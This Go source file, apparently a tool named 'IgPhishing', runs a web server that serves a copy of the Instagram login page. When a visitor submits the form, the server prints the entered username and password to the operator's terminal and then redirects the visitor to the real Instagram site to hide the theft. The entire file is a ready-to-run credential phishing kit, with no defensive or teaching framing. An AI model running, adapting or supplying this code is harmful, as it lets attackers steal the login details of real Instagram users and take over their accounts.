package main

import (
	"fmt"
	"html/template"
	"io"
	"net/http"
)

var tmpl = template.Must(template.New("index").Parse(`
<head>
  <link rel="Icon" type="image/x-icon" href="https://a-manu.com/wp-content/uploads/sites/171/2017/04/instagram-Logo-PNG-Transparent-Background-download-300x300.png">
  <title>Instagram</title>
</head>
<body>
  <span id="root">
    <section class="section-all">
      <style>
	  /* Universal Selectors */
#root, body, html {
    height:100%;
  }
  
  body {
    overflow-y: scroll;
  }
  
  a, abbr, acronym, address, applet, article, aside, audio, b, big, blockquote, body, canvas, caption, center, cite, code, dd, del, details, dfn, div, dl, dt, em, embed, fieldset, figcaption, figure, footer, form, h1, h2, h3, h4, h5, h6, header, hgroup, html, i, iframe, img, ins, kbd, label, legend, li, mark, menu, nav, object, ol, output, p, pre, q, ruby, s, samp, section, small, span, strike, strong, sub, summary, sup, table, tbody, td, tfoot, th, thead, time, tr, tt, u, ul, var, video {
    margin:0;
    padding:0;
    border:0;
    font:inherit;
    vertical-align: baseline;
  } 
  
  a, a:visited {
    text-decoration: none;
  }
  a:active, .btn:active {
    opacity:.5;
  }
  
  ol, ul {
    list-style: none;
  }
  
  body, button, input {
    font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
    font-size:14px;
    line-height:18px;
  }
  
  #root, article, main, div, section, header, nav, footer {
    border: 0 solid #000000;
    box-sizing: border-box;
    align-items: stretch;
    display: flex;
    flex-direction: column;
    flex-shrink: 0;
    margin:0;
    padding:0;
    position: relative;
    -webkit-box-align: stretch;
      -moz-box-align: stretch;
    -webkit-box-orient: vertical;
      -moz-box-orient: vertical;
    -webkit-box-direction: normal;
      -moz-box-direction: normal;
  } /* <--Universal Selectors End */
  
  
  #root {
    z-index: 0;
  }
  
  .section-all {
    min-height:100%;
    overflow:hidden;
  }
  
  .main {
    background-color: #fafafa;
    order: 4;
    flex-grow: 1;
    -webkit-box-flex: 1;
    -moz-box-flex: 1;
    -moz-box-ordinal-group: 5;
    -webkit-box-ordinal-group: 5;
  }
  
  .wrapper {
    min-height:100%;
    overflow: hidden;
  }
  
  .wrapper, .article {
    flex-grow: 1;
    justify-content: center;
    -webkit-box-flex: 1;
      -moz-box-flex: 1;
    -webkit-box-pack: center;
      -moz-box-pack: center;
  }
  
  .article {
    flex-direction: row;
    margin:0 auto;
    max-width: 935px;
    width:100%;
    -webkit-box-orient: horizontal;
      -moz-box-orient: horizontal;
    -webkit-box-direction: normal;
      -moz-box-direction: normal;
  }
  
  .content {
    color:#262626;
    flex-grow:1;
    justify-content: center;
    max-width: 350px;
    margin-top:12px;
    -webkit-box-pack: justify;
      -moz-box-pack: justify;
    -webkit-box-flex: 1;
      -moz-box-flex: 1;  
  }
  
  .login-box {
    background: #fff;
    border: 1px solid #e6e6e6;
    border-radius: 1px;
    margin:0 0 10px;
    padding: 10px 0;
    /* align-items: center; */
  }
  
  .header {
    margin: 14.45px auto 12px;
  }
  
  .logo {
    background: cover no-repeat;
    width:175px;
    height:auto;
  }
  
  .form {
    display: flex;
    flex-direction: column;
    margin-bottom: 10px;
    -moz-box-direction: normal;
    -webkit-box-direction: normal;
  }
  
  .input-box {
    margin:auto 40px 6px;
  }
  
  input {
    height: 36px;
    border: 1px solid #efefef;
    border-radius: 3px;
    background-color: #fafafa;
    width:100%;
    font-size:12px;
    margin: 0;
    padding: 9px 0 7px 8px;
    outline: none;
    overflow: hidden;
    text-overflow: ellipsis;
    box-sizing: border-box;
  }
  input#name:focus, input#password:focus {
    border-color:#bbb;
  }
  
  .button-box {
    display: block;
    position: relative;
    margin: 8px 40px;
  }
  .btn {
    cursor: pointer;
    width: 100%;
    padding:0 8px; 
    background: #3897f0;
    border:1px solid #3897f0;
    color:#fff;
    border-radius:3px;
    font-weight:600;
    font-size: 14px;
    height: 28px;
    line-height: 26px;
    outline: none;
    white-space: nowrap;
  }
  
  .forgot, .forgot:active, .forgot:hover, .forgot:visited {
    font-size:12px;
    margin-top:12px;
    text-align: center;
    color:#003569;
    line-height: 14px!important;
  }
  
  .text {
    text-align:center;
    margin:15px;
    color:#262626;
    font-size:14px;
  }
  
  .text a, .text a:visited, .text a:hover, .text a:active {
    color:#3897f0;
    margin-left:3px;
  }
  
  /* App Store */
  .app p {
    line-height: 18px;
    color:#262626;
    font-size:14px;
    text-align:center;
    margin:10px 20px;
  }
  
  .app-img {
    flex-direction: row;
    justify-content: center;
    margin:10px 0;
    -webkit-box-orient: horizontal;
    -moz-box-orient: horizontal;
  }
  
  .app-img a {
    margin-right:8px;
    height: 43.5px;
  }
  
  .app-img img {
    height:40px;
  }
  
  /* FOOTER */
  .footer {
    background-color: #fafafa;
    order: 5;
    padding: 0 20px;
    background: #fafafa;
  }
  
  .footer-container {
    flex-direction: row;  
    flex-wrap:wrap;
    background-color: #fafafa;
    justify-content: space-between;
    padding: 38px 0;
    max-width:935px;
    font-size:12px;
    font-weight:600;
    margin:0 auto;
    text-transform:uppercase;
    width:100%
  }
  
  .footer-nav {
    max-width:100%;
  }
  
  .footer-nav ul {
    margin-right:16px;
    margin-bottom:3px;
    flex-grow:1;
  }
  
  .footer-nav ul li {
    display: inline-block;
    margin-right: 13px;
    margin-bottom:7px;
  }
  
  .footer-nav ul li a {
    color: #003569;
    text-decoration: none;
  }
  
  .footer span {
    color:#999;
  }
  
  span.language { 
    color: #003569;
    cursor: pointer;
    display: inline-block;
    font-weight: 600;
    position: relative;
    text-transform: uppercase;
    vertical-align: top;
  }
  
  .select {
    cursor: pointer;
    height: 100%;
    top: 0;
    opacity: 0;
    position: absolute;
    left:0;
    width: 100%;
  }
  
  /* Media Queries */
  @media (max-width:450px) {
    .main {
      background-color: #fff;
    }
  
    .content {
      max-width: 100%;
      margin-top: 0;
      justify-content: space-between;
    }
  
    .login-box {
      background-color: transparent;
      border:none;
    }
  
    .logo {
      background: cover no-repeat;
      width:175px;
      height:auto;
      margin:0 auto;
    }
  
    .btn {
      cursor: pointer;
      width: 100%;
      padding:0 8px; 
      background: #3897f0;
      border:1px solid #3897f0;
      color:#fff;
      border-radius:3px;
      font-weight:600;
      font-size: 14px;
      height: 28px;
      line-height: 26px;
      outline: none;
      white-space: nowrap;
    }
  
    .input-box {
      border: 1px solid #efefef;
      border-radius: 3px;
      height: 36px;
      background: #fafafa;
      position: relative;
    }
  
    input {
      border: 0;
      background-color: #fafafa;
      width:100%;
      font-size:12px;
      margin: 0;
      padding: 9px 0 7px 8px;
      outline: none;
      overflow: hidden;
      text-overflow: ellipsis;
      box-sizing: border-box;
    }
  
    .input-box:hover, .input-box:focus {
      border-color:#bbb;
    }
  
  }
  
  @media only screen and (max-width:875px) {
    .footer-container {
      text-align: center;
      padding:10px 0;
    }
    .footer-container,  .footer-nav ul {
      justify-content: center;
      margin:0 auto;
      max-width: 360px;
      min-width: auto;
      -webkit-box-pack: center;
      -moz-box-pack: center;
    }
  
  }
	</style>
      <!-- 1-Role Main -->
      <main class="main" role="main">
        <div class="wrapper">
          <article class="article">
            <div class="content">
              <div class="login-box">
                <div class="header">
                  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
                </div><!-- Header end -->
                <div class="form-wrap">
                  <form class="form" action="/" method="POST">
                    <div class="input-box">
                      <input type="text" id="input1" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="input1" required>
                    </div>  

                    <div class="input-box">
                      <input type="password" name="input2" id="input2" placeholder="Password" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
                    </div>  

                    <span class="button-box">
                      <button class="btn" type="submit" name="submit">Log in</button>
                    </span>  

                    <a class="forgot" href="https://www.instagram.com/accounts/password/reset">Forgot password?</a>
                  </form>
                </div> <!-- Form-wrap end -->
              </div> <!-- Login-box end -->

              <div class="login-box">
                <p class="text">Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup">Sign up</a></p>
              </div> <!-- Signup-box end -->

              <div class="app">
                <p>Get the app.</p>
                <div class="app-img">
                  <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" >
                  </a>
                  <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
                  </a>  
                </div>  <!-- App-img end-->
              </div> <!-- App end -->
            </div> <!-- Content end -->
          </article>
        </div> <!-- Wrapper end -->
      </main>

      <!-- 2-Role Footer -->
      <footer class="footer" role="contentinfo">
        <div class="footer-container">

          <nav class="footer-nav" role="navigation">
            <ul>
			  <li><a href=""></a></li>
              <li><a href="https://about.instagram.com">About Us</a></li>
              <li><a href="https://help.instagram.com">Support</a></li>
              <li><a href="https://about.instagram.com/blog">Blog</a></li>
              <li><a href="https://about.instagram.com/about-us/careers">Jobs</a></li>
              <li><a href="https://www.instagram.com/developer">Api</a></li>
              <li><a href="https://help.instagram.com/519522125107875">Privacy</a></li>
              <li><a href="https://help.instagram.com/581066165581870">Terms</a></li>
              <li><a href="https://www.instagram.com/directory/hashtags">Directory</a></li>
			  <li><a href="">Instagram</a></li>
            </ul>
          </nav>

          <span class="footer-logo">&copy; 2021 Instagram</span>
        </div> <!-- Footer container end -->
      </footer>
    </section>
  </span> <!-- Root -->
</body>
`))

func getRoot(w http.ResponseWriter, r *http.Request) {

	// Handle form submission
	if r.Method == "POST" {
		r.ParseForm()
		input1 := r.FormValue("input1")
		input2 := r.FormValue("input2")

		// Write form values to terminal
		fmt.Println("\033[35mUsername: \033[0m", "\033[32m", input1, "\033[0m")
		fmt.Println("\033[35mPassword: \033[0m", "\033[32m", input2, "\033[0m")

		// Render the page with the values from the form
		w.Header().Set("Content-Type", "text/html")
		io.WriteString(w, fmt.Sprintf(`
		<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="0; url=https://www.instagram.com/">
</head>
<body>
</body>
</html>
		`))
		return
	}

	// If not POST, render the form
	tmpl.Execute(w, nil)
}

func main() {
	fmt.Print(`
  _[]      ____  _     _     _     _             
 |_ _|__ _|  _ \| |__ (_)___| |__ (_)_ __   __ _ 
  | |/ _` + "`" + ` | |_) | '_ \| / __| '_ \| | '_ \ / _` + "`" + ` |
  | | (_| |  __/| | | | \__ \ | | | | | | | (_| |
 |___\__, |_|   |_| |_|_|___/_| |_|_|_| |_|\__, |
     |___/                                 |___/ 
     Made by HeJo
 `)
	fmt.Printf("\033[32mStarting server at http://localhost:3333\n\033[0m")
	http.HandleFunc("/", getRoot)

	err := http.ListenAndServe(":3333", nil)
	if err != nil {
		fmt.Printf("Error starting server: %s\n", err)
	}
}
